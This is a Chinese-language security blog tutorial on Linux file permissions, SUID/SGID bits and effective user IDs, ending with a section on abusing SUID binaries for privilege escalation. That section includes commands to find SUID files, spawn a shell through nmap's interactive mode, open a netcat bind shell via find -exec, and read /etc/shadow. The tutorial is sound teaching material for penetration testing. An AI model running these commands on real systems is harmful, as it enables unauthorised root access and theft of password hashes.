---
title: Linux SUID/SGID介绍及利用
date: 2020-06-12 17:24:25
id: 20200612172425
tags: 
	- 提权
	- Linux
categories: 网络安全
---

# 0x00 Linux文件属性

通过`ls -l`我们可以查看各个文件的访问权限。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200612173855.png)

我们可以观察上方的这几个例子。

刚开始的第一位表示的是该文件的类型，有p、d、l、s、c、b和-。

| 符号 | 含义             |
| ---- | ---------------- |
| p    | 表示命名管道文件 |
| d    | 表示目录         |
| l    | 表示符号链接文件 |
| -    | 表示普通文件     |
| s    | 表示socket文件   |
| c    | 表示字符设备文件 |
| b    | 表示块设备文件   |

之后的每三位分别表示文件所有者的权限、同组用户的权限、其他用户的权限。

| 符号 | 含义 |
| ---- | ---- |
| w    | 写   |
| r    | 读   |
| x    | 执行 |

之后的数字表示硬链接的个数，然后就是文件所有者，所在组，再然后是文件的大小，和最新的更改时间，最后是文件名。

```bash
drwxr-xr-x  11 optimus  staff   352  2 18 12:01 tools
```

如上，这是一个目录，所有者optimus的权限为读写执行权限（这里的执行权限为搜索位，表示可以读写该目录的文件），所在组为staff，同组用户权限为读执行，其他用户的权限为读权限，有11个硬链接，大小为352，最新更新时间为2月18日12：01，文件名是tools。

# 0x01 SUID与SGID

如果我们设置了SUID或SGID，那么所有者权限或同组权限的可执行位置就变为了s（区分大小写）。

| 属性       | 含义                                               |
| ---------- | -------------------------------------------------- |
| -rwsr-xr-x | 表示SUID和所有者权限中可执行位被设置               |
| -rwSr--r-- | 表示SUID被设置，但所有者权限中可执行位没有被设置   |
| -rwxr-sr-x | 表示SGID和同组用户权限中可执行位被设置             |
| -rw-r-Sr-- | 表示SGID被设置，但同组用户权限中可执行位没有被设置 |

一个文件的权限，是由12位二进制位来表示的，第11位为SUID位，第10位为SGID位，第9位为sticky位，第8-0位对应于上面的三组rwx位。

```bash
-rwxr-xr-x  11 optimus  staff   352  2 18 12:01 myfile
```

以上面为例，任何用户都可以执行这个程序。UNIX的内核是根据什么来确定一个进程对资源的访问权限的呢？是这个进程的运行用户的（有效）ID，包括user id和group id。用户可以用id命令来查到自己的或其他用户的user id和group id。

除了一般的user id 和group id外，还有两个称之为effective 的id，就是有效id，上面的四个id表示为：uid，gid，euid，egid。内核主要是根据euid和egid来确定进程对资源的访问权限。

一个进程如果没有SUID或SGID位，则euid=uid egid=gid，分别是运行这个程序的用户的uid和gid。例如jeffrey用户的uid和gid分别为204和202，optimus用户的uid和gid为200，201，jeffrey运行myfile程序形成的进程的euid=uid=204，egid=gid=202，内核根据这些值来判断进程对资源访问的限制，其实就是jeffrey用户对资源访问的权限，和optimus没关系。

如果一个程序设置了SUID，则euid和egid变成被运行的程序的所有者的uid和gid，例如jeffrey用户运行myfile，euid=200，egid=201，uid=204，gid=202，则这个进程具有它的属主optimus的资源访问权限。

SUID的作用就是这样：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。passwd就是一个很鲜明的例子。

# 0x02 利用

可利用的命令有nmap、vim、find、bash、more、less、nano、cp。

#### 查找开启SUID的命令

```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

#### nmap利用

nmap版本小于5.21时，可打开交互模式。

```bash
nmap —interactive
nmap>!sh
```

也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。

```bash
exploit/unix/local/setuid_nmap
```

在这个脚本中有一段注释。

```
Note that modern interpreters will refuse to run scripts on the command line when EUID != UID, so the cmd/unix/reverse_{perl,ruby} payloads will most likely not work.
```

这段注释的翻译为

```
注意，当EUID != UID时，现代解释器将拒绝在命令行上运行脚本，因此cmd/unix/reverse_{perl,ruby}负载很可能无法工作。
```

#### find利用

```bash
find existFile -exec whoami \;
find existFile -exec nc -lvp 4444 -e /bin/sh \;
find existFile -exec cat /etc/shadow \;
```

其中第二个命令在实践时发现打开的命令行任然是普通用户的权限。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200614174739.png)

可以看到这时的uid和euid的值都为1000。因此这种方式现在可能会失效。但是其他方式还是可以的。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200614174907.png)

